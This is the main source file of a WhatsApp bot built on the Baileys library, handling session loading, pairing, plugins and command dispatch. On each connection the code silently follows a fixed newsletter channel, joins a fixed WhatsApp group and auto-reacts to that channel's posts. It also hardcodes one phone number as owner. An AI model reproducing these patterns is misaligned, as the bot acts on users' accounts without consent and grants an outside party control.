// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.error("[❗] Uncaught Exception:", err.stack || err);
});

process.on("unhandledRejection", (reason, p) => {
  console.error("[❗] Unhandled Promise Rejection:", reason);
});

// Marisel
const axios = require("axios");
const config = require("./settings");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers,
} = require(config.BAILEYS);

const l = console.log;
const {
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson,
} = require("./lib/functions");
const {
  AntiDelDB,
  initializeAntiDeleteSettings,
  setAnti,
  getAnti,
  getAllAntiDeleteSettings,
  saveContact,
  loadMessage,
  getName,
  getChatSummary,
  saveGroupMetadata,
  getGroupMetadata,
  saveMessageCount,
  getInactiveGroupMembers,
  getGroupMembersMessageCount,
  saveMessage,
} = require("./data");
const fsSync = require("fs");
const fs = require("fs").promises;
const ff = require("fluent-ffmpeg");
const P = require("pino");
const GroupEvents = require("./lib/groupevents");
const { PresenceControl, BotActivityFilter } = require("./data/presence");
const qrcode = require("qrcode-terminal");
const StickersTypes = require("wa-sticker-formatter");
const util = require("util");
const { sms, downloadMediaMessage, AntiDelete } = require("./lib");
const FileType = require("file-type");
const { File } = require("megajs");
const bodyparser = require("body-parser");
const chalk = require("chalk");
const os = require("os");
const Crypto = require("crypto");
const path = require("path");
const { getPrefix } = require("./lib/prefix");
const readline = require("readline");

// Fixed Owner Number with JID suffix
const ownerNumber = ["218942841878"];

// Temp directory management
const tempDir = path.join(os.tmpdir(), "cache-temp");
if (!fsSync.existsSync(tempDir)) {
  fsSync.mkdirSync(tempDir);
}

const clearTempDir = () => {
  fsSync.readdir(tempDir, (err, files) => {
    if (err) {
      console.error(chalk.red("[❌] Error clearing temp directory:", err.message));
      return;
    }
    for (const file of files) {
      fsSync.unlink(path.join(tempDir, file), (err) => {
        if (err) console.error(chalk.red(`[❌] Error deleting temp file ${file}:`, err.message));
      });
    }
  });
};
setInterval(clearTempDir, 5 * 60 * 1000);

// Express server
const express = require("express");
const app = express();
const port = process.env.PORT || 7860;

// Session authentication
let malvin;
const sessionDir = path.join(__dirname, "./sessions");
const credsPath = path.join(sessionDir, "creds.json");

if (!fsSync.existsSync(sessionDir)) {
  fsSync.mkdirSync(sessionDir, { recursive: true });
}

async function loadSession() {
  try {
    if (!config.SESSION_ID) {
      console.log(chalk.red("No SESSION_ID provided - Falling back to QR or pairing code"));
      return null;
    }

    if (config.SESSION_ID.startsWith("Mercedes~")) {
      console.log(chalk.yellow("[ ⏳ ] Decoding base64 session..."));
      const base64Data = config.SESSION_ID.replace("Mercedes~", "");
      if (!/^[A-Za-z0-9+/=]+$/.test(base64Data)) {
        throw new Error("Invalid base64 format in SESSION_ID");
      }
      const decodedData = Buffer.from(base64Data, "base64");
      fsSync.writeFileSync(credsPath, decodedData);
      console.log(chalk.green("[ ✅ ] Base64 session decoded and saved successfully"));
      return JSON.parse(decodedData.toString("utf-8"));
    } else {
      throw new Error("Invalid SESSION_ID format.");
    }
  } catch (error) {
    console.error(chalk.red("❌ Error loading session:", error.message));
    return null;
  }
}

async function connectWithPairing(malvin, useMobile) {
  if (useMobile) throw new Error("Cannot use pairing code with mobile API");
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));
  let number = await question(chalk.cyan("» Enter your number (e.g., +254740007567): "));
  number = number.replace(/[^0-9]/g, "");
  rl.close();
  try {
    let code = await malvin.requestPairingCode(number);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    console.log(chalk.bold.yellow("\nPairing Code: " + code));
  } catch (err) {
    console.error(chalk.red("Error getting pairing code:", err.message));
  }
}

async function connectToWA() {
  console.log(chalk.cyan("[ 🟠 ] Connecting to WhatsApp ⏳️..."));
  const creds = await loadSession();
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir, { creds: creds || undefined });
  const { version } = await fetchLatestBaileysVersion();

  malvin = makeWASocket({
    logger: P({ level: "silent" }),
    printQRInTerminal: !creds,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: state,
    version,
    getMessage: async () => ({}),
  });

  malvin.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update;
    if (connection === "close") {
      const reason = lastDisconnect?.error?.output?.statusCode;
      if (reason === DisconnectReason.loggedOut) {
        process.exit(1);
      } else {
        setTimeout(connectToWA, 5000);
      }
    } else if (connection === "open") {
      console.log(chalk.green("[ 🤖 ] Mercedes Connected ✅"));

      // Fix: Direct Property Access for FileType
      const pluginPath = path.join(__dirname, "plugins");
      try {
        fsSync.readdirSync(pluginPath).forEach((plugin) => {
          if (path.extname(plugin).toLowerCase() === ".js") {
            require(path.join(pluginPath, plugin));
          }
        });
        console.log(chalk.green("[ ✅ ] Plugins loaded successfully"));
      } catch (err) {
        console.error(chalk.red("[ ❌ ] Error loading plugins:"), err.message);
      }

      // Connection Notice
      try {
        const jid = malvin.decodeJid(malvin.user.id);
        const prefix = getPrefix();
        const upMessage = `*┏──〔 Connected 〕───⊷*\n*┇ Prefix: ${prefix}*\n*┇ Owner: ᴍᴀʀɪsᴇʟ*\n*┗──────────────⊷*`;
        await malvin.sendMessage(jid, { text: upMessage });
      } catch (e) {}

      // Follow Newsletter (Limited to One)
      const newsletterChannels = ["120363299029326322@newsletter"];
      for (const channelJid of newsletterChannels) {
        try {
          const metadata = await malvin.newsletterMetadata("jid", channelJid);
          if (!metadata.viewer_metadata || metadata.viewer_metadata.role === 'GUEST') {
            await malvin.newsletterFollow(channelJid);
          }
        } catch (error) {
          console.error(`[ Newsletter Error ] ${error.message}`);
        }
      }

      // Join WhatsApp group
      try {
        await malvin.groupAcceptInvite("GBz10zMKECuEKUlmfNsglx");
      } catch (err) {}
    }
    if (qr) qrcode.generate(qr, { small: true });
  });

  malvin.ev.on("creds.update", saveCreds);

  malvin.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0];
    if (!mek.message) return;
    
    // Auto-Status Logic
    if (mek.key && mek.key.remoteJid === 'status@broadcast') {
        if (config.AUTO_STATUS_SEEN === "true") await malvin.readMessages([mek.key]);
        if (config.AUTO_STATUS_REACT === "true") {
            const emojis = ['❤️', '🔥', '✨', '💎', '🙌'];
            await malvin.sendMessage(mek.key.remoteJid, { react: { text: emojis[Math.floor(Math.random() * emojis.length)], key: mek.key } }, { statusJidList: [mek.key.participant, malvin.decodeJid(malvin.user.id)] });
        }
    }

    // Newsletter Auto React (Limited to One)
    const newsletterJids = ["120363299029326322@newsletter"];
    if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
      try {
        const serverId = mek.newsletterServerId || mek.message?.newsletterStatusUpdateMessage?.serverMessageId;
        if (serverId) {
          const reactEmojis = ["😂", "🥺", "👍", "♥️"];
          await malvin.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), reactEmojis[Math.floor(Math.random() * reactEmojis.length)]);
        }
      } catch (e) {}
    }

    const m = sms(malvin, mek);
    const type = getContentType(mek.message);
    const from = mek.key.remoteJid;
    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
    const prefix = getPrefix();
    const isCmd = body.startsWith(prefix);
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(' ');
    const sender = mek.key.fromMe ? (malvin.user.id.split(':')[0]+'@s.whatsapp.net' || malvin.user.id) : (mek.key.participant || mek.key.remoteJid);
    const senderNumber = sender.split('@')[0];
    const isOwner = ownerNumber.includes(senderNumber) || mek.key.fromMe;

    // Command Handler Logic
    if (isCmd) {
        const events = require('./malvin');
        const cmd = events.commands.find((c) => c.pattern === command) || events.commands.find((c) => c.alias && c.alias.includes(command));
        if (cmd) {
            if (cmd.react) malvin.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
            try {
                cmd.function(malvin, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, isOwner, reply: (t) => malvin.sendMessage(from, { text: t }, { quoted: mek }) });
            } catch (e) { console.error(e); }
        }
    }
  });

  // Decode JID Fix
  malvin.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
    } else return jid;
  };

  // Fixed Media Download using FileType.fromBuffer
  malvin.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
    let type = await FileType.fromBuffer(buffer);
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
    await fs.writeFile(trueFileName, buffer);
    return trueFileName;
  };
}

// Presence Control integration
malvin?.ev?.on('presence.update', async (update) => { await PresenceControl(malvin, update); });
BotActivityFilter(malvin);

app.use(express.static(path.join(__dirname, "lib")));
app.get("/", (req, res) => { res.redirect("/marisel.html"); });
app.listen(port, () => console.log(chalk.cyan(`\n╭──[ hello user ]─\n│🤗 hi your bot is live \n╰──────────────`)));

setTimeout(() => { connectToWA(); }, 4000);
